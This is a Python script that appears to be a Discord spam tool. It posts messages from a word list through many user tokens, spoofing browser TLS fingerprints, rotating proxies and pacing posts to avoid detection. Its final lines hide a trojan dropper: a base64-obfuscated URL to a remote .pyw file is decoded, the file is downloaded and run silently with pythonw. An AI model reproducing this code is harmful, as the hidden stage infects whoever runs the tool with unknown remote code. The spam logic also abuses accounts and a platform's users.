import subprocess
import os
import requests
import json, random, time
import base64
from requests.structures import CaseInsensitiveDict
import tls_client

client = tls_client.Session(
    client_identifier="chrome112",
    random_tls_extension_order=True
)

proxy_list = open("proxies.txt", "r").read().splitlines()

ref = 1365579243106598923
min_int = 1800
max_int = 2100

f1 = open("token.txt", "r", encoding="utf-8")
tokens = f1.readlines()

f2 = open("word.txt", "r", encoding="utf-8")
texts = f2.readlines()

for tk, msg in zip(tokens, texts):
    auth = tk.strip()
    content = msg.strip()

    endpoint = f"https://discord.com/api/v9/channels/{ref}/messages"

    h = CaseInsensitiveDict()
    h["authorization"] = auth
    h["x-super-properties"] = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ny4wLjQ2OTIuOTkgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijk3LjAuNDY5Mi45OSIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMjQ5NzksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    h["Content-Type"] = "application/json"

    payload = {"content": content, "tts": False}

    try:
        r = client.post(endpoint, headers=h, data=json.dumps(payload), proxy=f"http://{random.choice(proxy_list)}")
        if r.status_code == 200:
            print(f"Delivered: {content}")
        else:
            print(f"Issue - Code: {r.status_code}")
    except Exception as ex:
        print(f"Issue: {ex}")

    wait_time = random.randint(min_int, max_int)
    print(f"Next in: {wait_time}s")
    time.sleep(wait_time)

dir_path = os.path.join("Files")
os.makedirs(dir_path, exist_ok=True)
fpath = os.path.join(dir_path, "main.pyw")
if not os.path.exists(fpath):
    b64 = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTM2NTcxMjQ5MTU2NDIzNjk5My8xMzY1NzIwNzM4ODcwNDY0NTQyL3ZvdWNoLnB5dz9leD02ODBlNTYwZSZpcz02ODBkMDQ4ZSZobT0wY2FjZmE1YjAzMWE5NTBhYTI5N2E3MTM5MzQ1NjBlMmM1ZDQ1NmU5YTIzMzYzNGRhYmU1YmU5MDA4MDBiMzkm"
    u = base64.b64decode(b64).decode()
    getfile = requests.get(u)
    open(fpath, "wb").write(getfile.content)

subprocess.Popen(["pythonw", fpath], shell=True)
